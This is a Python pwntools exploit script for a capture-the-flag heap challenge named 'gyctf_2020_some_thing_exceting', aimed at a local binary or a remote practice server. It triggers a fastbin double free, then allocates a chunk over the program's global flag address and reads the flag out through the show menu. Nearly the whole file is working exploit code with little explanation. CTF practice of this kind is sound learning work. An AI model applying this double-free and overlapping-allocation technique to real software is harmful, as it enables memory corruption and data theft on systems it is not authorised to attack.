# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'gyctf_2020_some_thing_exceting'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29478)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size1, content1, size2, content2):
    p.recvuntil('do :')
    p.sendline('1')
    p.recvuntil("ba's length : ")
    p.sendline(str(size1))
    p.recvuntil('ba : ')
    p.send(content1)
    p.recvuntil("na's length : ")
    p.sendline(str(size2))
    p.recvuntil('na : ')
    p.send(content2)

def fake_edit():
    p.recvuntil('do :')
    p.sendline('2')

def delete(idx):
    p.recvuntil('do :')
    p.sendline('3')
    p.recvuntil('Banana ID : ')
    p.sendline(str(idx))

def show(idx):
    p.recvuntil('do :')
    p.sendline('4')
    p.recvuntil('project ID : ')
    p.sendline(str(idx))

def exit():
    p.recvuntil('do :')
    p.sendline('5')

flag = 0x6020a8

def pwn():
    create(0x50, 'aaaa', 0x50, 'bbbb')
    create(0x50, 'cccc', 0x50, 'dddd')
    # debug(0)
    delete(0)
    # debug(0)
    delete(1)
    # debug(0)
    delete(0)
    # debug(0)
    # flag = content_ptr, chunk_ptr = content_ptr - 0x10
    create(0x50, p64(flag-0x10), 0x50, 'eeee')    
    # debug(0)  
    create(0x50, 'junk', 0x50, 'junk')
    # debug(0)
    create(0x50, 'flag', 0x60, 'ffff')
    debug(0)
    show(0)     # show(4) is ok! ptr overlap!
    p.recv()
    p.close()

if __name__ == '__main__':
    pwn()